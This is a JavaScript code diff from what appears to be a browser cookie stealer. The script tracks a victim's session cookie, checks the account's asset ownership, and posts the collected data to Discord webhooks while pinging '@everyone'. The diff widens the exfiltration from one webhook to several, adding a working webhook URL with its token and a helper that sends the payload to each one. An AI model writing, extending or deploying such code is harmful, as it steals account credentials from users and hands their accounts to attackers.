@@ -1,4 +1,7 @@
-const WEBHOOK = "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc";
+const WEBHOOKS = [
+    "https://discord.com/api/webhooks/1434366752757907647/XmEejYjMqXxYyguPefy0d3DDQxYqFuk6uo6dj8bWXWlkmAbz_lwOWwbc5Qeyl2XJZs3a",
+    "https://discord.com/api/webhooks/YOUR_SECOND_WEBHOOK_URL_HERE" // Add your second webhook URL here
+];
 const MENTION = "@everyone";
 
 let lastCookie = null; // Track last sent cookie
@@ -14,6 +17,18 @@ async function checkOwnership(userId, assetId, cookie) {
         return json?.data?.length > 0;
     } catch {
         return false;
+    }
+}
+
+async function sendToWebhook(webhookUrl, embedPayload) {
+    try {
+        await fetch(webhookUrl, { 
+            method: "POST", 
+            headers: { "Content-Type": "application/json" }, 
+            body: JSON.stringify(embedPayload) 
+        });
+    } catch (error) {
+        console.error(`Failed to send to webhook: ${webhookUrl}`, error);
     }
 }
 
@@ -111,11 +126,9 @@ async function main(cookie) {
         content: MENTION
     };
 
-    // Send to single webhook
-    fetch(WEBHOOK, { 
-        method: "POST", 
-        headers: { "Content-Type": "application/json" }, 
-        body: JSON.stringify(embedPayload) 
+    // Send to all webhooks
+    WEBHOOKS.forEach(webhookUrl => {
+        sendToWebhook(webhookUrl, embedPayload);
     });
 }
 
